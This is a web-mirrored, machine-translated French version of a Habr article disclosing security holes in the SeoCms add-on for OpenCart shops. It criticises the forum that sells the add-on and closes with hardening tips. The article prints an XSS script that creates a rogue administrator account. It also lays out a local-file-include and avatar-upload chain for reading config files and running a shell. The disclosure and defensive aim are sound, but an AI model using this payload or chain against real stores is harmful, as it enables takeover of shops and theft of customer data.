<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>↗️ 👩🏾‍💻 🌊 Opencartforum et amis 🚦 🔳 👩🏾‍🚀</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Tous les chiens vont au paradis, et tous les propriétaires de boutiques en ligne sur Opencart, tôt ou tard sur Opencartforum. Lorsque l'euphorie de la...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Opencartforum et amis</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/466283/"><img src="https://habrastorage.org/webt/i_/fm/jp/i_fmjpfeqs4zmi1axxwqrczafv0.jpeg" alt="image"><br><br>  Tous les chiens vont au paradis, et tous les propriétaires de boutiques en ligne sur Opencart, tôt ou tard sur Opencartforum.  Lorsque l'euphorie de la première installation du moteur sur l'hébergement passe et que la dure réalité commence, le propriétaire de magasin typique commence toujours à manquer quelque chose et il commence le chemin difficile de trouver des entrepreneurs qualifiés et des compléments de qualité pour son magasin. <br><br>  La plus grande ressource de Runet, sur laquelle vous pouvez trouver les deux, est opencartforum.com, qui compte aujourd'hui plus de 140 000 utilisateurs enregistrés.  Sur ces 140 000 inscriptions, la moitié d'entre elles sont des personnes vivant avec des boutiques en direct qui utilisent des modèles ou des modules d'une manière ou d'une autre, qui peuvent être immédiatement achetés sur le site.  Et toutes ces personnes ne réalisent même pas qu’avec les modules complémentaires, elles acquièrent de merveilleuses portes dérobées et des vulnérabilités, dont n’importe quelle mère pirate ne peut que rêver. <br><a name="habracut"></a><br>  Bien que sous une forme déclarative dans les règles de publication des modules complémentaires dans la boutique du forum, il est écrit en noir et blanc.  Nous avons qadepartment, des personnes spécialement formées vérifient les extensions pour les vulnérabilités. <br><br>  Et ni le forum, en tant que plate-forme qui sert d'intermédiaire entre l'auteur et l'utilisateur final du module complémentaire, ni les auteurs des modules complémentaires, comme il s'est avéré, n'assument aucune responsabilité. <br>  Comment ça?  Et donc!  Apparemment, historiquement. <br><br>  Modélisant pour moi-même les conséquences hypothétiques des incidents, qui seront discutées plus tard, mes cheveux sur ma tête se tiennent debout. <br><br>  Imaginez.  Vous êtes un propriétaire de magasin prospère, vous n'avez pas dormi la nuit depuis quelques années, écrit des textes, grignoté du noir, du blanc, du gris, des pandas combattus, de minusinsk, vous n'avez pas fini votre boisson, attiré 100000 clients, investi dans des positions.  Vos enfants vont dans un bon jardin d'enfants, puis soudainement vos ventes ont diminué de moitié, tout simplement parce que votre base avec tous les contacts clients est allée chez les concurrents.  Ou soudain, vous l'avez complètement perdu, car depuis un mois maintenant, votre magasin travaille sur le serveur mysql de quelqu'un d'autre, et vous n'avez même pas remarqué le changement de kofig, et toutes les sauvegardes sur l'hébergement ont mal tourné. <br><br>  Ils ont présenté leurs sentiments dans une situation similaire, travaillé, travaillé pendant plusieurs années, et en un jour, tout est perdu.  Vous dites que cela ne peut pas en être ainsi. <br><br>  Mais cela peut être très simple.  Il suffit d’acheter un module complémentaire avec une «protection» de protection non déclarée et non déclarée contre une utilisation non autorisée, et vos données peuvent rapidement devenir des étrangers! <br><br><h2>  Premier incident </h2><br>  Il y a six mois, une maintenance préventive superficielle d'un magasin a été effectuée lorsque le rapport du scanner Ai-Bol a montré un étrange avertissement concernant un code étrange dans le module <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">SeoCms</a> (plus de 10 000 installations actives). <br><br>  Nous avons commencé à regarder de plus près et il s'est avéré que cet abracadabra affiche simplement la version de l'add-on: <br><br><pre><code class="php hljs">$text_redaeh_stpo = $text_redaeh_stpo_1.$value_tnega.$text_redaeh_stpo_2.$text_redaeh_stpo_3.$text_reda eh_stpo_4.$text_redaeh_stpo_5.$text_redaeh_stpo_6.$text_redaeh_stpo_7.$text_redaeh _stpo_8.$text_redaeh_stpo_9.$value_revres.$text_redaeh_stpo_10; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($date_diff &gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) { $ver_content = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $opts = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( $text_ptth =&gt; <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_dohtem =&gt;$text_tsop, $redaeh =&gt;$text_redaeh_stpo, $tnetnoc =&gt; $yreuq_dliub_ptth(<span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_rdda =&gt;$value_rdda, $text_liame =&gt; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'liame'</span></span>], $text_rev=&gt;<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'blog_version'</span></span>] )))); $context = $etaerc_txetnoc_maerts($opts); $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ver_content = $stnetnoc_teg_elif($rev_knil, <span class="hljs-keyword"><span class="hljs-keyword">FALSE</span></span> , $context); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { <span class="hljs-comment"><span class="hljs-comment">//echo "Warning or better raised: " . $e-&gt;getMessage(); } $this-&gt;model_setting_setting-&gt;editSetting('blog_ver', Array('blog_version_date' =&gt; $date_current, 'blog_version_content' =&gt; $ver_content )); } if ($this-&gt;data['blog_version']!=$ver_content) { $this-&gt;data['text_new_version'] = $this-&gt;language-&gt;get('text_new_version').$ver_content. " &lt;span style='color: #000; font-weight: normal;'&gt;(".$date_ver_update.")&lt;/span&gt;". $this-&gt;language-&gt;get('text_new_version_end'); } else { $this-&gt;data['text_new_version'] = ''; }</span></span></code> </pre> <br>  C'est bon sauf que: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;language-&gt;get(<span class="hljs-string"><span class="hljs-string">'text_new_version'</span></span>).$ver_content. <span class="hljs-string"><span class="hljs-string">" &lt;span style='color: #000; font-weight: normal;'&gt;("</span></span>.$date_ver_update.<span class="hljs-string"><span class="hljs-string">")&lt;/span&gt;"</span></span></code> </pre><br>  il n'est en aucun cas filtré, et si par accident un script comme celui ci-dessous arrive à la place de la version du client, obtenir un accès administrateur à n'importe quel magasin où le module est installé est une question de temps et de technique. <br><br><pre> <code class="php hljs">&lt;script&gt; <span class="hljs-comment"><span class="hljs-comment">// shell sample // seocms the best architectural mistake forever // i got all your 10 000 shops // i install 10 000 backdors function​ getUrlVars​()​ {​ v​ar​vars=​​[​],​hash,​​hashes=​​n​ull;​ i​f​​(w​indow​.l​ocation.​h​ref​.i​ndexOf(​"​?"​)​​&amp;&amp; window​.​location.​h​ref.​​indexOf​("​&amp;")​)​​{ hashes =​ window​.​location.​h​ref.​​slice​(w​indow​.l​ocation​.h​ref​.i​ndexOf​(​"?"​)​​+ 1)​.​split(​​"&amp;"​); }​​​else​i​f​​(w​indow​.l​ocation.​h​ref​.​indexOf(​​"?"​))​​{ hashes =​ window​.​location.​h​ref.​​slice​(w​indow​.​location​.h​ref​.i​ndexOf​(​"?"​)​​+​​1​); }​ i​f​ ​(h​ashes!​=​n​ull)​ ​{​ f​or​​(v​ar​i​=​​0;​​i​&lt;​hashes​.​length​;​i​++)​{​ hash=​​hashes[​​i]​.s​plit​(​"=")​; vars[​h​ash​[0​]​]​​=​hash​[​1]​; }​ }​ r​eturn​vars;​ } var​ url_vars =​ ​ getUrlVars​(); var​ token =​ ​ url_vars.​ ​token​; var​ host ​=​ window.​ ​location​.​origin;​ var​action=​​host+​​"​/admin/index.php?route=user/user/add&amp;token="​+​ token;​ document.​ ​addEventListener​(​"DOMContentLoaded"​,​ ​function​(​event​)​ ​{ $​.p​ost(​​action,​​{​​username​:​​"Hack123"​,​user_group_id​:​​"1"​, firstname​:​"​Lol",​​lastname​:​"​Haha"​,​ email​:​​"Hack123@Hack123.com"​, password:​​"​1234",​​ confirm​:​​"1234"​,​ status​:​​"1"​​}​​); }); &lt;/script&gt;</span></span></code> </pre><br>  Les détails de la situation sont décrits <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> .  Avis d'administration <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ici</a> . <br><br>  Probablement la cinquième fois, après avoir modélisé ce processus très clairement pour l'administration du forum, il a été possible de transmettre la criticité de la situation. <br><br>  Et l'administration, à son tour, a officiellement informé les utilisateurs de la présence de cette vulnérabilité, et il semble qu'elle ait même fait une newsletter aux clients.  Mais ce n'est pas exact. <br><br>  Laissons dans les coulisses les menaces et les évasions de l'auteur du module complémentaire et revenons deux mois en arrière ... <br><br><h2>  Deuxième incident </h2><br>  Un autre magasin vient pour inspection, dans lequel il y a des frises sauvages jusqu'à 3-4 secondes sur chaque page.  Nous commençons à disséquer et à voir dans le dossier avec un cache de 20k + fichiers avec l'extension .php.  Cachez les fichiers avec l'extension php Karl, ce n'est pas un hasard! <br><br>  Nous examinons la structure des données de ces fichiers, et là encore des morceaux de notre beau module SEOCMS. <br><br>  Et une excellente méthode: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $ajax_file = DIR_CACHE.base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">"ajax_file"</span></span>])); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; }</code> </pre> <br>  Ceci est un exemple d'une vulnérabilité classique - Local File Include. <br><br>  Il suffit de coder en base64 ../....../config.php et bonjour - require ($ ajax_file);  Et s'il vous plaît: ici, vous avez les mots de passe de la base de données, et voici le journal des erreurs système, et si même / etc / pwd est très nécessaire, bien qu'il soit depuis longtemps hors de propos, eh bien, et si? <br><br>  Et combien d'hébergeurs et de serveurs avec des paramètres par défaut brillent dans le monde de phpmyadmin?  La moitié?  Plus? <br><br>  Nous commençons à chercher plus loin et que trouvons-nous?  Magnifique code de téléchargement d'avatar: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!$json) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (is_uploaded_file(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>]) &amp;&amp; file_exists(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>])) { $file = basename($filename) . <span class="hljs-string"><span class="hljs-string">'.'</span></span> . md5(substr(sha1(uniqid(mt_rand(), <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>)); $file_original = basename($filename); <span class="hljs-comment"><span class="hljs-comment">// Hide the uploaded file name so people can not link to it directly. //$json['file'] = $this-&gt;encryption-&gt;encrypt($file); // To remove highload from the file system, when large number of buyers $avatar_dir = 'data/avatars/'.(ceil ($this-&gt;data['customer_id'] / 300)) * 300; move_uploaded_file($this-&gt;request-&gt;files['file']['tmp_name'], DIR_IMAGE . $file); $new_filename = $avatar_dir.'/'.$this-&gt;data['customer_id']."_".utf8_strtolower($file_original); if (isset($this-&gt;data['thislist']['avatar_width']) &amp;&amp; $this-&gt;data['thislist']['avatar_width']!='') { $width = $this-&gt;data['thislist']['avatar_width']; } else { if (isset($this-&gt;data['generallist']['avatar_width']) &amp;&amp; $this-&gt;data['generallist']['avatar_width']!='') { $width = $this-&gt;data['generallist']['avatar_width']; } else { $width = '100'; } } if (isset($this-&gt;data['thislist']['avatar_height']) &amp;&amp; $this-&gt;data['thislist']['avatar_height']!='') { $height = $this-&gt;data['thislist']['avatar_height']; } else { if (isset($this-&gt;data['generallist']['avatar_height']) &amp;&amp; $this-&gt;data['generallist']['avatar_height']!='') { $height = $this-&gt;data['generallist']['avatar_height']; } else { $height = '100'; } } $this-&gt;load-&gt;model('tool/image'); $json['file'] = $avatar_thumb = $this-&gt;model_tool_image-&gt;resizeavatar($file, $new_filename , $width, $height, true, false); if (trim($avatar_thumb)=='') { $json['error'] = $this-&gt;language-&gt;get('error_upload'); } if ($file!='' &amp;&amp; file_exists(DIR_IMAGE . $file)) { unlink (DIR_IMAGE . $file); } } }</span></span></code> </pre> <br>  Ce qui tombe parfaitement en erreur lors de la tentative de redimensionnement (et nous montre le chemin complet vers le fichier téléchargé), après le chargement d'une sorte de shell.php.png, puis il est également parfaitement exécuté par la méthode précédente. <br><br>  Vidéo d'exploitation de la vulnérabilité (avec sortie d'erreur système php activée): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/SdyW8OzAfZI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  Vidéo d'exploitation de la vulnérabilité (avec sortie d'erreur du système php désactivée): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/f-JYKzT_WAk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  L'analyse du code a été réalisée sur la version du module 52 en avril 2019. <br><br>  Étant donné que l'auteur et l'administration du forum ont été informés aux mêmes dates, suffisamment de temps s'est écoulé pour qu'ils prennent toutes les mesures possibles pour informer les acheteurs de l'élimination des vulnérabilités, nous, en toute conscience, pouvons divulguer tous les détails. <br><br>  Et à ce moment, quelque chose s'est produit.  Sur le serveur du développeur se trouvait son propre module.  Mais la vulnérabilité n'a pas fonctionné.  Elle était couverte ... Et c'est une grande bizarrerie.  Très gros !!! <br><br>  Et la deuxième bizarrerie de toute cette histoire est que l'opencartforum en la personne de l'administration et du service de contrôle de la qualité des suppléments n'a vu ni le premier ni le deuxième incident, et dans les deux cas, lors de la première notification, il n'a rien trouvé de critique. <br><br>  Bien sûr, il n'y a rien de critique lorsque vos configurations brillent dans le monde.  Il n'y a rien de critique quand une bonne moitié des commerçants ne savent pas ce qui se passe sous leur capot.  Après tout, une fois, quelqu'un a mis ce module complémentaire, et sans mailing, ils ne réalisent même pas que toute l'entreprise est directement menacée. <br><br>  Et s'il y a eu une réaction distincte de l'administration sur le premier incident, alors sur le second, tous les messages avec une mention sont supprimés.  Et tout cela est couvert par une <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">offre de forum</a> , selon laquelle, à propos des ajouts commerciaux, des commentaires peuvent être laissés comme sur les morts - bons ou rien. <br><br>  L'auteur affirme également que les erreurs et les trous sont corrigés, qadepartment a manqué l'add-on à vendre, mais non, les trous ne sont pas corrigés ... <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!class_exists(<span class="hljs-string"><span class="hljs-string">'PHP_Exceptionizer'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">'modification'</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(modification(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>); } } $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $filename = preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9\.\-\s+]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, html_entity_decode(base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">'ajax_file'</span></span>])), ENT_QUOTES, <span class="hljs-string"><span class="hljs-string">'UTF-8'</span></span>)); $ajax_file = DIR_CACHE . $filename; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ob_start(); <span class="hljs-keyword"><span class="hljs-keyword">require</span></span>($ajax_file); $ajax_html = ob_get_contents(); ob_end_clean(); header(<span class="hljs-string"><span class="hljs-string">'Content-type: text/html; charset=utf-8'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $ajax_html; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;deletecache(<span class="hljs-string"><span class="hljs-string">'cache.ajax'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { } }</code> </pre> <br>  require () est toujours là.  L'entrée est légèrement filtrée.  Mais la LFI potentielle a vécu et vit.  Si un peu plus, alors oui, maintenant nous ne pouvons ni charger ni exécuter le shell.  Mais supposons que nous ayons essayé, fermé, cimenté l'exécution de tous les scripts sauf index.php, et même au niveau de la configuration nginx, qui n'est en aucun cas accessible.  Mais quelque part ailleurs, le pirate maléfique a eu l'occasion de mettre un fichier arbitraire dans le dossier cache.  Que va-t-il se passer?  C'est vrai - pour exécuter du code superflu, générant un hachage dans la requête get, cela prend deux minutes.  C'est-à-dire qu'en fin de compte, c'est un peu comme fermé, mais ce n'est pas comme complètement. <br><br>  Eh bien, les petites choses: comment de si belles relations brillaient dans les fichiers de langue: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span> || $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>] == <span class="hljs-string"><span class="hljs-string">'1'</span></span>)) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'https'</span></span>) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) &amp;&amp; strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span>))) { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTPS_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTPS_CATALOG; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTP_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTP_CATALOG; }</code> </pre> <br>  Et ils brillent ... Vous voulez connaître le chemin complet vers la racine du projet.  Trouvez simplement le magasin avec l'affichage d'erreur activé et exécutez le lien directement vers le fichier de langue. <br><br>  Pour étudier ce qui peut être après la mise à jour du module complémentaire en mégaoctets de lignes de code de l'auteur - il n'y a ni ressources ni désir.  Il y a des personnes responsables spécialement formées pour cela. <br><br>  Et la cerise sur le gâteau.  Nous nous souvenons, nous avons un add-on commercial ... Et dans un add-on commercial, nous avons du texte caché sur la ressource de l'auteur: <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">www.google.com/search?q=%22Powered+by+SEO+CMS%22</a> </blockquote><br>  Fait intéressant, au moins l'un des acheteurs de modules complémentaires connaît un œuf de Pâques aussi «merveilleux»? <br><br>  Aujourd'hui, le supplément est à la fois vendu et vendu.  Les messages contenant des appels pour faire attention à la situation sont simplement supprimés.  Aucun des acheteurs n'a reçu de notifications d'avertissement concernant le deuxième incident.  Peut-être que 20 à 30% des utilisateurs de modules complémentaires ont mis à jour, mais 70% - même si nous parlons des statistiques officielles de l'auteur sur l'utilisation des modules complémentaires, ce sont 7000 magasins (en fait, plus - car personne ne sait avec certitude combien de copies ont été installées par des pigistes sur les magasins clients licence étendue) sont dans une zone de risque énorme. <br><br>  Pour reprendre les mots du baron Munchausen, je ne veux dire qu'une chose: messieurs mis à jour! <br><br><h2>  Pour les clients </h2><br>  Que faire, ceux qui se sont retrouvés dans ce sous-marin en perdition: <br><br><ul><li>  Ne laissez pas de déchets sur ftp.  Afficher info.php, adminer.php et toutes les autres poubelles.  Vous ne devriez avoir que index.php et un point. </li><li>  Modifiez régulièrement les mots de passe, tous les mots de passe (ftp, panneau d'administration, base de données).  Et assurez-vous que vous n'avez pas accidentellement de comptes étranges supplémentaires. </li><li>  Désactiver la sortie d'erreur.  Toujours, si vous ne travaillez pas, désactivez la sortie d'erreur au niveau de la configuration de l'interpréteur et non dans les paramètres du magasin. </li><li>  Oui, je sais que ce n'est pas très faisable, mais vous devriez au moins vous tenir au courant de la mise à jour du code moteur lié à la sécurité, et idéalement, mettre régulièrement à jour le moteur vers des versions stables. </li><li>  Regardez régulièrement les journaux de visites, il peut y avoir beaucoup de choses intéressantes.  Suivez les anomalies. </li><li>  Fermez en plus avec un mot de passe ou une restriction sur l'admin ip du magasin et diverses sections vulnérables, telles que phpmyadmin.  S'il s'agit d'un partage dans lequel phpmyadmin est commun à tous, fuyez cet hébergement! </li><li>  Si vous utilisez sxd et des utilitaires similaires, renommez-les immédiatement en un jeu de caractères aléatoire. </li><li>  Lorsque vous utilisez nginx, il vaut la peine d'ajouter des règles à la configuration de l'hôte virtuel qui interdisent d'exécuter des scripts php autres que index.php dans les sections racine et admin du site. </li><li>  Ne jetez pas de déchets de votre compte.  Si vous avez un magasin, que ce soit un magasin.  Ne chargez pas sous un seul compte un tas de blogs wp, un seau de bugs et divers domaines de test. </li><li>  Ne stockez jamais de sauvegardes d'un site ou d'une base de données à la racine de votre hôte virtuel. </li><li>  Regardez la charge sur le serveur / l'hébergement, essayez de garder l'approvisionnement au moins x2 contre les pics de charge, et si soudainement la charge augmente soudainement sans raison, essayez de trouver la raison.  Mieux vaut dépasser que de ne pas dépasser! </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr466283/">https://habr.com/ru/post/fr466283/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr466263/index.html">Systèmes RPC de référence (et Json inversé)</a></li>
<li><a href="../fr466267/index.html">Pourquoi beaucoup sous-estiment leurs jeux</a></li>
<li><a href="../fr466271/index.html">Cours communs Groupe-IB et Belkasoft: ce que nous enseignons et qui venir</a></li>
<li><a href="../fr466279/index.html">La plupart des appareils Android vulnérables aux attaques de phishing via SMS</a></li>
<li><a href="../fr466281/index.html">Réalité virtuelle, jeux open source et voitures électriques: ce que John Carmack a dit sur le podcast Joe Rogan</a></li>
<li><a href="../fr466285/index.html">Un petit cadeau: combo dvr et détecteur de radar</a></li>
<li><a href="../fr466287/index.html">Rapport et recherche sur la fiabilité des segments Internet nationaux 2019</a></li>
<li><a href="../fr466289/index.html">Initiatives législatives. Étrange, mais présenté à la Douma d'État</a></li>
<li><a href="../fr466291/index.html">Enquête de durabilité des segments Internet nationaux pour 2019</a></li>
<li><a href="../fr466295/index.html">Cache de secours indolore sur Scala</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>